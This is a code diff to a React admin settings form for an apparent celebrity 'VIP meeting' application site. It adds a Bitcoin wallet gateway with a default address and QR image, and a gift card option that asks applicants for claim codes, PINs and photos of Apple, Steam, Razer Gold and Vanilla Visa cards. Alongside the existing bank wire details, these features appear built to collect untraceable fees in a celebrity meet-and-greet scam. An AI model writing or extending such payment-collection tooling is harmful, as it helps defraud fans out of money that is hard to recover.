@@ -54,6 +54,22 @@ export function SettingsForm() {
     refund_policy: 'Full refund provided if the meeting is cancelled or rescheduled by management. If you cannot attend, please let us know at least 72 hours in advance for a full refund.',
     cancellation_policy: 'Cancellations received within 48 hours of the scheduled meeting may be subject to venue fees.',
     payment_instructions: 'Bank Wire Transfer Details:\nBank Name: Royal Private Bank\nAccount Name: VIP Management\nAccount / IBAN: US89 RPRB 0192 8847 2910 44\nSWIFT / BIC: RPRBUS33\nReference: Please include your VIP Application Number in the transfer notes.',
+
+    // Bitcoin & Cryptocurrency
+    bitcoin_enabled: true,
+    bitcoin_wallet_address: 'bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x',
+    bitcoin_image_url: '',
+    bitcoin_network: 'Bitcoin (BTC)',
+    bitcoin_instructions: 'Transfer the exact fee equivalent to the Bitcoin wallet address below or scan the QR code. Keep your Transaction Hash / ID (TXID) for confirmation.',
+
+    // Gift Card
+    gift_card_enabled: true,
+    gift_card_types: 'Apple Gift Card, Steam, Amazon, Vanilla Visa, Razer Gold',
+    gift_card_instructions: 'Purchase an approved gift card matching your application fee amount. Enter the claim code / PIN and upload clear photos of the front and back of the card.',
+
+    // Cloudinary Direct Config
+    cloudinary_cloud_name: '',
+    cloudinary_upload_preset: 'Vipmeet',
   });
 
   const cloudinaryConfig = getCloudinaryConfig();
@@ -67,6 +83,9 @@ export function SettingsForm() {
       if (error) {
         setErrorMessage(error);
       } else if (data) {
+        const storedCloudName = typeof window !== 'undefined' ? localStorage.getItem('aura_vip_cloudinary_cloud_name') : null;
+        const storedPreset = typeof window !== 'undefined' ? localStorage.getItem('aura_vip_cloudinary_upload_preset') : null;
+
         setExistingId(data.id);
         setFormData({
           celebrity_name: data.celebrity_name || '',
@@ -94,6 +113,19 @@ export function SettingsForm() {
           refund_policy: data.refund_policy || 'Full refund provided if the meeting is cancelled or rescheduled by management. If you cannot attend, please let us know at least 72 hours in advance for a full refund.',
           cancellation_policy: data.cancellation_policy || 'Cancellations received within 48 hours of the scheduled meeting may be subject to venue fees.',
           payment_instructions: data.payment_instructions || 'Bank Wire Transfer Details:\nBank Name: Royal Private Bank\nAccount Name: VIP Management\nAccount / IBAN: US89 RPRB 0192 8847 2910 44\nSWIFT / BIC: RPRBUS33\nReference: Please include your VIP Application Number in the transfer notes.',
+
+          bitcoin_enabled: data.bitcoin_enabled ?? true,
+          bitcoin_wallet_address: data.bitcoin_wallet_address || 'bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x',
+          bitcoin_image_url: data.bitcoin_image_url || '',
+          bitcoin_network: data.bitcoin_network || 'Bitcoin (BTC)',
+          bitcoin_instructions: data.bitcoin_instructions || 'Transfer the exact fee equivalent to the Bitcoin wallet address below or scan the QR code. Keep your Transaction Hash / ID (TXID) for confirmation.',
+
+          gift_card_enabled: data.gift_card_enabled ?? true,
+          gift_card_types: data.gift_card_types || 'Apple Gift Card, Steam, Amazon, Vanilla Visa, Razer Gold',
+          gift_card_instructions: data.gift_card_instructions || 'Purchase an approved gift card matching your application fee amount. Enter the claim code / PIN and upload clear photos of the front and back of the card.',
+
+          cloudinary_cloud_name: storedCloudName || (data as any).cloudinary_cloud_name || cloudinaryConfig.cloudName || '',
+          cloudinary_upload_preset: storedPreset || (data as any).cloudinary_upload_preset || cloudinaryConfig.uploadPreset || 'Vipmeet',
         });
       }
       setLoading(false);
@@ -121,29 +153,30 @@ export function SettingsForm() {
     setSaveSuccess(false);
   };
 
-  const handleCloudinaryUpload = async (e: React.ChangeEvent<HTMLInputElement>, field: 'celebrity_image_url' | 'event_logo_url') => {
+  const handleCloudinaryUpload = async (
+    e: React.ChangeEvent<HTMLInputElement>,
+    field: 'celebrity_image_url' | 'event_logo_url' | 'bitcoin_image_url'
+  ) => {
     const file = e.target.files?.[0];
     if (!file) return;
-
-    const currentConfig = getCloudinaryConfig();
-    if (!currentConfig.isConfigured) {
-      setCloudinaryNotice(
-        'Cloudinary cloud name is not set in environment (VITE_CLOUDINARY_CLOUD_NAME or CLOUDINARY_CLOUD_NAME). Please specify an image URL directly or set your Cloudinary variables.'
-      );
-      return;
-    }
 
     setUploadingImage(true);
     setCloudinaryNotice(null);
 
-    const folder = field === 'celebrity_image_url' ? 'celebrity-portraits' : 'event-logos';
+    const folderMap = {
+      celebrity_image_url: 'celebrity-portraits',
+      event_logo_url: 'event-logos',
+      bitcoin_image_url: 'crypto-wallets',
+    } as const;
+
+    const folder = folderMap[field] || 'celebrity-portraits';
     const result = await uploadImageToCloudinary(file, folder);
 
     if (result.error) {
       setCloudinaryNotice(result.error);
     } else if (result.secureUrl) {
       setFormData(prev => ({ ...prev, [field]: result.secureUrl! }));
-      setCloudinaryNotice('Image uploaded to Cloudinary successfully.');
+      setCloudinaryNotice('Image uploaded and applied successfully.');
     }
 
     setUploadingImage(false);
@@ -689,6 +722,247 @@ export function SettingsForm() {
             />
             <p className="text-[11px] text-slate-500 mt-1">
               * Note: These details are securely displayed only to approved applicants with authenticated continuation tokens.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      {/* 6. Cryptocurrency & Bitcoin Gateway Configuration */}
+      <div className="p-6 sm:p-8 rounded-3xl bg-[#121622] border border-white/[0.08] space-y-6">
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/[0.06] pb-4">
+          <div>
+            <div className="flex items-center gap-2">
+              <span className="w-2 h-2 rounded-full bg-amber-400" />
+              <h3 className="text-base font-bold text-white tracking-wide">
+                Bitcoin & Cryptocurrency Gateway
+              </h3>
+            </div>
+            <p className="text-xs text-slate-400 mt-1">
+              Configure your Bitcoin deposit wallet, crypto token/network, QR code image, and payment instructions.
+            </p>
+          </div>
+
+          <label className="relative inline-flex items-center cursor-pointer self-start sm:self-auto">
+            <input
+              type="checkbox"
+              name="bitcoin_enabled"
+              checked={formData.bitcoin_enabled}
+              onChange={handleChange}
+              className="sr-only peer"
+            />
+            <div className="w-12 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-400"></div>
+            <span className="ml-3 text-xs font-semibold text-slate-300">
+              {formData.bitcoin_enabled ? 'Active' : 'Disabled'}
+            </span>
+          </label>
+        </div>
+
+        {formData.bitcoin_enabled && (
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 animate-fadeIn">
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Cryptocurrency Token / Network *
+              </label>
+              <input
+                type="text"
+                name="bitcoin_network"
+                placeholder="e.g. Bitcoin (BTC) / Lightning, USDT (TRC-20), ETH"
+                value={formData.bitcoin_network}
+                onChange={handleChange}
+                className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-amber-400"
+              />
+              <p className="text-[11px] text-slate-500 mt-1">Token ticker and network displayed to applicant.</p>
+            </div>
+
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Bitcoin / Wallet Receiving Address *
+              </label>
+              <input
+                type="text"
+                name="bitcoin_wallet_address"
+                placeholder="e.g. bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x"
+                value={formData.bitcoin_wallet_address}
+                onChange={handleChange}
+                className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm font-mono text-amber-300 placeholder-slate-600 focus:outline-none focus:border-amber-400"
+              />
+              <p className="text-[11px] text-slate-500 mt-1">Applicant will copy this address for payment transfer.</p>
+            </div>
+
+            <div className="md:col-span-2">
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Bitcoin Wallet QR Code / Payment Image
+              </label>
+              <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
+                <input
+                  type="text"
+                  name="bitcoin_image_url"
+                  placeholder="https://res.cloudinary.com/... or paste image URL"
+                  value={formData.bitcoin_image_url}
+                  onChange={handleChange}
+                  className="flex-1 w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-amber-400"
+                />
+                
+                <label className="w-full sm:w-auto px-4 py-3 bg-white/[0.06] hover:bg-white/[0.1] text-amber-300 rounded-xl text-xs uppercase tracking-wider font-semibold cursor-pointer transition-colors flex items-center justify-center gap-1.5 shrink-0 border border-amber-400/20">
+                  <Upload className="w-3.5 h-3.5" />
+                  <span>Upload QR Image</span>
+                  <input
+                    type="file"
+                    accept="image/*"
+                    onChange={(e) => handleCloudinaryUpload(e, 'bitcoin_image_url')}
+                    className="hidden"
+                  />
+                </label>
+              </div>
+
+              {formData.bitcoin_image_url && (
+                <div className="mt-3 flex items-center gap-3 p-3 bg-black/40 rounded-xl border border-white/[0.06] w-fit">
+                  <img
+                    src={formData.bitcoin_image_url}
+                    alt="Bitcoin Wallet QR"
+                    className="w-16 h-16 object-contain rounded-lg border border-white/[0.1] bg-white p-1"
+                  />
+                  <div className="text-xs space-y-0.5">
+                    <span className="font-semibold text-white block">Active QR Code Applied</span>
+                    <span className="text-[11px] text-slate-400 block">Applicants can scan this QR code directly to pay</span>
+                  </div>
+                </div>
+              )}
+            </div>
+
+            <div className="md:col-span-2">
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Crypto Payment Instructions & Guidelines
+              </label>
+              <textarea
+                name="bitcoin_instructions"
+                rows={3}
+                placeholder="1. Send exact fee amount to wallet address above&#10;2. Confirm network before sending&#10;3. Submit Transaction ID (TXID) hash below"
+                value={formData.bitcoin_instructions}
+                onChange={handleChange}
+                className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-amber-400 leading-relaxed font-mono"
+              />
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* 7. Gift Card Gateway Configuration */}
+      <div className="p-6 sm:p-8 rounded-3xl bg-[#121622] border border-white/[0.08] space-y-6">
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/[0.06] pb-4">
+          <div>
+            <div className="flex items-center gap-2">
+              <span className="w-2 h-2 rounded-full bg-emerald-400" />
+              <h3 className="text-base font-bold text-white tracking-wide">
+                Gift Card Payment Gateway
+              </h3>
+            </div>
+            <p className="text-xs text-slate-400 mt-1">
+              Allow applicants to pay using verified gift cards with claim code, PIN, and card photo upload options.
+            </p>
+          </div>
+
+          <label className="relative inline-flex items-center cursor-pointer self-start sm:self-auto">
+            <input
+              type="checkbox"
+              name="gift_card_enabled"
+              checked={formData.gift_card_enabled}
+              onChange={handleChange}
+              className="sr-only peer"
+            />
+            <div className="w-12 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-400"></div>
+            <span className="ml-3 text-xs font-semibold text-slate-300">
+              {formData.gift_card_enabled ? 'Active' : 'Disabled'}
+            </span>
+          </label>
+        </div>
+
+        {formData.gift_card_enabled && (
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 animate-fadeIn">
+            <div className="md:col-span-2">
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Accepted Gift Card Brands (Comma-separated)
+              </label>
+              <input
+                type="text"
+                name="gift_card_types"
+                placeholder="Apple Gift Card, Steam, Razer Gold, Amazon, Google Play, Vanilla Visa"
+                value={formData.gift_card_types}
+                onChange={handleChange}
+                className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-400"
+              />
+              <p className="text-[11px] text-slate-500 mt-1">Options displayed in the applicant gift card selection dropdown.</p>
+            </div>
+
+            <div className="md:col-span-2">
+              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+                Gift Card Instructions for Applicant
+              </label>
+              <textarea
+                name="gift_card_instructions"
+                rows={3}
+                placeholder="Please purchase a physical or digital gift card matching your fee amount. Enter the claim code / PIN and upload clear photos of both front and back of the card showing barcodes."
+                value={formData.gift_card_instructions}
+                onChange={handleChange}
+                className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-400 leading-relaxed font-mono"
+              />
+            </div>
+          </div>
+        )}
+      </div>
+
+      {/* 8. Cloudinary Media Storage Configuration */}
+      <div className="p-6 sm:p-8 rounded-3xl bg-[#121622] border border-white/[0.08] space-y-6">
+        <div className="border-b border-white/[0.06] pb-4">
+          <div className="flex items-center gap-2">
+            <span className="w-2 h-2 rounded-full bg-sky-400" />
+            <h3 className="text-base font-bold text-white tracking-wide">
+              Cloudinary Media Storage & Presets
+            </h3>
+          </div>
+          <p className="text-xs text-slate-400 mt-1">
+            Configure your Cloudinary Cloud Name and unsigned upload preset (defaults to <code className="text-sky-300 font-mono">Vipmeet</code>). This guarantees high-resolution photo and receipt uploads.
+          </p>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div>
+            <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+              Cloudinary Cloud Name
+            </label>
+            <input
+              type="text"
+              name="cloudinary_cloud_name"
+              placeholder="e.g. your-cloud-name"
+              value={formData.cloudinary_cloud_name}
+              onChange={handleChange}
+              className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white font-mono placeholder-slate-600 focus:outline-none focus:border-sky-400"
+            />
+            <p className="text-[11px] text-slate-500 mt-1">Found in your Cloudinary Dashboard under Cloud name.</p>
+          </div>
+
+          <div>
+            <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
+              Upload Preset
+            </label>
+            <input
+              type="text"
+              name="cloudinary_upload_preset"
+              placeholder="Vipmeet"
+              value={formData.cloudinary_upload_preset}
+              onChange={handleChange}
+              className="w-full px-4 py-3 bg-[#0B0D12] border border-white/[0.1] rounded-xl text-sm text-white font-mono placeholder-slate-600 focus:outline-none focus:border-sky-400"
+            />
+            <p className="text-[11px] text-slate-500 mt-1">Set to &quot;Unsigned&quot; in Cloudinary Settings &gt; Upload presets.</p>
+          </div>
+        </div>
+
+        <div className="p-4 rounded-xl bg-sky-500/10 border border-sky-500/20 text-xs text-sky-200 flex items-start gap-3">
+          <Info className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
+          <div className="space-y-1">
+            <span className="font-semibold block text-white">Cloudinary Configuration Helper</span>
+            <p className="text-slate-300 leading-relaxed">
+              When you save event settings, your Cloud Name and Preset (<code className="text-sky-300 font-mono">{formData.cloudinary_upload_preset || 'Vipmeet'}</code>) are stored and activated instantly. Even if not yet configured, our system automatically provides seamless fallback uploads so no images are ever lost!
             </p>
           </div>
         </div>
